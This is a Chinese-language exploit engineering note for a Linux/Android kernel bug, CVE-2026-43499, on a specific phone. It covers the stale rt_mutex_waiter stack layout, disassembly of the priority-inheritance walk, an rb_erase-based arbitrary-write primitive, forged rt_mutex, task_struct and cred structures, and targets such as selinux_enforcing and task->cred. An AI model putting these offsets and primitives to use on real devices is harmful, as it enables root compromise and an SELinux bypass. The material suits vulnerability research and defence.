# rt_mutex_waiter 布局与 PI walk 写原语

> 日期：2026-09-13
> 关联：[利用报告](2026-09-13_利用报告-iqooneo9s-ghostlock.md) · [MCAST transport](2026-09-13_技术分析-mcast-transport.md)
> 结论：stale `rt_mutex_waiter` 位于 waiter 线程内核栈固定位置（本机 `S'−0x2D8`）；`rt_mutex_adjust_prio_chain` 读取 `lock/prio/deadline` 并执行 rb 树操作，节点 `{pc=value, right=0, left=target}` 被擦除时构成 `*(target) := value` 写原语。

## 1. 触发链：为什么栈上会残留 waiter

CVE-2026-43499 的表现为：waiter 线程从 `FUTEX_WAIT_REQUEUE_PI` 返回后，`task->pi_blocked_on`（task+0x950）仍悬挂指向它先前在栈上构造的 `rt_mutex_waiter`。

| 站点 | 行为 | 说明 |
|------|------|------|
| `task_blocks_on_rt_mutex @0x10a10e8` | `str x21,[x20,#0x950]` | **唯一置位**：`task->pi_blocked_on = waiter` |
| `try_to_take_rt_mutex @0x10a0d08` | `str xzr,[x19,#0x950]` | 清阻塞任务（正确语义） |
| `remove_waiter @0x10a15b0` | `str xzr,[x20,#0x950]` | 清 `current` 而非目标 waiter（**本机未修复**） |

利用窗口：waiter 线程返回用户态后立刻发起一个会阻塞的 syscall（本方案为 `setsockopt` 循环），在同一线程栈上重写该 waiter；consumer 线程对 waiter 线程 `sched_setattr` 触发 PI walk 消费伪造数据。

## 2. futex 调用链与 waiter 锚点

逐帧反汇编（E-001）：

| 层 | 函数（文件偏移） | 帧大小 | 备注 |
|----|------------------|--------|------|
| 1 | `__arm64_sys_futex @0x1af638` | 0x70 | |
| 2 | `do_futex @0x1af1a4` | 0xD0 | |
| 3 | `futex_wait_requeue_pi @0x1b2460` | 0x1C0 | `rt_waiter` 局部位于 `sp+0x28` |

`futex_wait_requeue_pi` 初始化 waiter 的关键指令（文件偏移 0x1b2460 起）：

```asm
add x27, sp, #0x28         ; waiter = sp+0x28
...
str x27, [sp, #0x28]       ; waiter->tree.__rb_parent_color = &waiter->tree（RB_CLEAR_NODE）
add x9, x27, #0x18
str x9, [sp, #0x40]        ; waiter->pi_tree.__rb_parent_color = &waiter->pi_tree
str xzr, [sp, #0x58]       ; waiter->task = NULL（waiter+0x30）
mov w8, #0x3
str w8, [sp, #0x68]        ; waiter->wake_state = 3（waiter+0x40）
```

因此 **waiter = 系统调用函数入口 S' − 0x300 + 0x28 = S'−0x2D8**。

与 panic 实测对照（E-009，panic #8）：waiter = `stack_top−0x4B8`；`top−0x110` 为 pt_regs，公共 SVC 入口路径约占 0xD0，故 `S' = top−0x1E0`，两者一致（`top−0x1E0−0x2D8 = top−0x4B8`）。

## 3. waiter 字段布局（compact 6.1）

来自 offsets.json（E-010）与 walk 反汇编交叉验证：

| 偏移 | 字段 | 来源/说明 |
|------|------|-----------|
| 0x00 | `tree.__rb_parent_color` | `waiter_tree: 0` |
| 0x08 | `tree.rb_right` | |
| 0x10 | `tree.rb_left` | |
| 0x18 | `pi_tree.__rb_parent_color` | `waiter_pi_tree: 24` |
| 0x20 | `pi_tree.rb_right` | |
| 0x28 | `pi_tree.rb_left` | |
| 0x30 | `task` | `waiter_task: 48` |
| 0x38 | `lock` | `waiter_lock: 56`（walk 第一处读取） |
| 0x40 | `wake_state` | `waiter_wake_state: 64` |
| 0x44 | `prio` | walk 读 `[x25+0x44]` |
| 0x48 | `deadline` | walk 读 `[x25+0x48]` |
| 0x50 | `ww_ctx` | `waiter_ww_ctx: 80` |

总大小 **0x58**。投毒必须覆盖 `0x00..0x58`（MCAST 拷贝覆盖 `buffer+0x60..0xB8`，余量充足）。

## 4. `rt_mutex_adjust_prio_chain` 读取行为

函数 `@0x10a1d1c`，帧 0x80（E-004）。入口：

```asm
add x26, x19, #0x924       ; x26 = &task->pi_lock
bl  0x10a4a7c              ; raw_spin_lock(&task->pi_lock)
ldr x25, [x19, #0x950]     ; waiter = task->pi_blocked_on
cbz x25, exit              ; 无 waiter 直接返回
...
ldr x8, [x25, #0x38]       ; waiter->lock
cmp x27, x8                ; 与 orig_waiter 比对（部分入口路径）
...
ldr w8,  [x19, #0x84]      ; task->prio
ldr w9,  [x25, #0x44]      ; waiter->prio
cmp w9, w8
b.ne 0x10a1e40             ; prio 不同 → 继续
...（prio 相同再看 deadline：task+0x298 vs waiter+0x48）
                           ; prio 与 deadline 均相同 → 提前返回（不触发写）
...
ldr x24, [x25, #0x38]      ; x24 = waiter->lock
mov x0, x24
bl  0x10a4804              ; _raw_spin_trylock(&lock->wait_lock)
cbnz w0, 0x10a1ee0         ; 成功 → 进入主循环
                           ; 失败 → 释放 pi_lock、yield、重试
```

主循环中的 rb 操作（节选）：

```asm
ldr x27, [x24, #0x10]      ; top_waiter = lock->waiters.rb_leftmost
...
ldr x8, [x25]              ; waiter->tree.__rb_parent_color
cmp x8, x25                ; RB_EMPTY_NODE?
b.eq skip_erase
...
bl  0x1078d9c              ; rb_next()
bl  0x107889c              ; rb_erase(&waiter->tree, &lock->waiters.rb_root)
str x25, [x25]             ; RB_CLEAR_NODE
...
ldr x8, [x25, #0x18]!      ; pi_tree（+0x18）
...
bl  0x107889c              ; rb_erase(pi_tree, &task->pi_waiters.rb_root)
```

涉及的其他关键调用：`rb_insert_color @0x1078770`、`wake_up_state @0xf93c8`（参数取 `waiter->task`=+0x30、`waiter->wake_state`=+0x40）、`rt_mutex_setprio @0xfc608`、trace hook `__traceiter_android_vh_rtmutex_waiter_prio @0xcf9104`。

**触发入口**：consumer 线程 `sched_setattr(waiter_tid, nice)` → `__sched_setscheduler @0xfd55c` → `rt_mutex_adjust_pi @0x10a1b7c` → `rt_mutex_adjust_prio_chain`。

## 5. rb_erase relink 写原语

利用把 8 字节控制值放在节点中，erase 该节点时产生两处写入。节点为 **RED**（无颜色修复、无 rebalance 遍历）。

### 5.1 值写（`{pc = value, right = 0, left = target}`）

```text
rb_erase(node, root):
  child = node->rb_right = 0
  tmp   = node->rb_left  = target
  进入 “left-only” 分支：
    target->__rb_parent_color = pc = value     ← 写 1：*(target) := value（8 字节）
    __rb_change_child(node, target, parent=value, root)
      if (*(value+8) == node)  *(value+8) = target   ← 写 2
      else                     *(value+0x10) = target
```

用途：W1 把页面地址 `base+0x100` 写到 `selinux_enforcing`（低位字节 0 关闭 enforcing；byte2 需为奇以保证 `selinux_state.initialized` 有效，见 E-008 页面筛选）；W2 把 `init_cred` 别名写到子进程 `task->cred`。

### 5.2 叶写（`{pc = target−8, right = 0, left = 0}`）

```text
if (!tmp)（left 为空）：
  pc = node->__rb_parent_color = target−8
  parent = target−8
  __rb_change_child(node, child=0, parent, root):
    if (*(target) == node)  *(target)     = 0    ← 写 A
    else                    *(target+8)   = 0    ← 写 B
```

用于 W3 等“写 0”场景；落点 `target`/`target+8` 取决于 `*(target)` 内容，W3-0 通过 comm 字段探测方向后选择目标（`leaf_to_target8`）。

### 5.3 设计约束

- `prio = 140 > 120`：源码注释注明该条件 gate 住 erase 分支（栈 waiter prio 与 fake task prio 的差）。waiter->prio 同时必须与真实 task prio 不同，否则 walk 在 prio/deadline 相等检查处提前返回。
- 叶写要求 `pc = target−8` 而**不能为 0**：`pc = 0` 会让节点在后续 `enqueue_pi` 中被丢弃并破坏 `fake_task`。
- 第二写会落在 `*(value+8)`（W2 为 cred 镜像、值写为页内 rb_root），目标页需预留安全数据。

## 6. 页面侧配套结构（投毒数据）

栈 waiter 被消费时，`waiter->lock` 指向页内伪造 `rt_mutex`，`waiter->task` 指向页内伪造 `task_struct`（pselect 布局，MCAST 路由复用）：

| 结构 | 页面偏移 | 关键内容 |
|------|----------|----------|
| fake `rt_mutex` | `LOCK_OFF = 0xE80` | `wait_lock=0`；`waiters.rb_root = waiters.rb_leftmost = fake_w0`；`owner = fake_task | 1` |
| fake waiter（W0） | `W0_OFF = 0x1180` | `tree={1,0,0}`；`pi={value,0,target}`（值写）；`task=INIT_TASK`；`lock=fake_lock`；`wake_state=0`；`prio=140` |
| fake `task_struct` | `FAKE_TASK_OFF = 0x1280` | `usage=0x100`、`prio=120`、`pi_lock=0`、空 `pi_waiters`、`sched_task_group=ROOT_TASK_GROUP`、`pi_top_task=INIT_TASK`、`pi_blocked_on=0` |
| cred 副本（W2） | `CRED_COPY_OFF = 0x1080` | `uid=0`、caps/secbits 全 0xFF… |

> MCAST 路由下 `prepare_skb_payload()` 使用 `payload_delta=-0xE80`：`fake_lock = base`、`fake_task = base+0x400`。

## 7. 失败签名（历史）

8 次同签名 panic（pstore/ramoops，E-009 为其中之一）：

```text
NULL pointer dereference at 0x0, ESR 0x96000005, level-1 translation fault
pc: _raw_spin_trylock+0x1c <- rt_mutex_adjust_prio_chain+0x130
    <- __sched_setscheduler <- __arm64_sys_sched_setattr (consumer 线程)
x19 = task; x26 = x19+0x924 (pi_lock); x25 = waiter (VMAP 栈地址)
x24 = 0 (waiter->lock); x0 = 0
```

含义：`pi_blocked_on` 悬挂存在，但 `waiter->lock` 为 0 —— 投毒未命中/被清零。根因（TCP transport 浅 0xF8）见[路线排查](2026-09-13_排查记录-投毒transport路线.md)。

## 8. 关键符号表（文件偏移 = 内核 VA − KIMAGE_TEXT_BASE）

| 符号 | 偏移 | 角色 |
|------|------|------|
| `__arm64_sys_futex` / `do_futex` / `futex_wait_requeue_pi` | 0x1af638 / 0x1af1a4 / 0x1b2460 | waiter 生成链 |
| `rt_mutex_adjust_prio_chain` | 0x10a1d1c | walk 主体 |
| `rt_mutex_adjust_pi` | 0x10a1b7c | walk 包装 |
| `__sched_setscheduler` | 0xfd55c | 触发入口 |
| `_raw_spin_trylock` | 0x10a4804 | 崩溃点（lock=NULL） |
| `rb_erase` / `rb_next` / `rb_insert_color` | 0x107889c / 0x1078d9c / 0x1078770 | relink 写 |
| `task_blocks_on_rt_mutex` / `remove_waiter` | 0x10a10e8 / 0x10a15b0 | `pi_blocked_on` 生命周期 |
| `wake_up_state` / `rt_mutex_setprio` | 0xf93c8 / 0xfc608 | 唤醒/优先级 |
| `__traceiter_android_vh_rtmutex_waiter_prio` | 0xcf9104 | 厂商 trace hook |
| `do_ip_setsockopt` / `__memset` / `copy_from_sockptr` | 0xed750c / 0x105c140 / 0xed8180 | MCAST 投毒 |
| `do_tcp_getsockopt` | 0xee7b48 | 旧 TCP 投毒（不可用） |

## 9. 附：`CONFIG_INIT_STACK_ALL_ZERO` 的影响

本机启用整帧零初始化：每个内核函数入口会把自身帧清零。因此：

1. waiter 残留窗口只到“同线程下一个覆盖该地址区间的 syscall”为止；中间 syscall（socket/bind/mmap/fallocate 等）都会抹掉投毒。
2. MCAST 路由把“发起 syscall（拷贝）→ 释放 consumer → consumer 触发 walk”绑定在同一尝试内，每次拷贝都完整重写 waiter；相比 TCP 路由不依赖中间态保留。
3. `arm_seq=16` + `post_hold` 的组合用于等待消费者就绪并保证 walk 在投毒后执行（实现细节见源码 `do_mcast_fake_lock_route()`）。
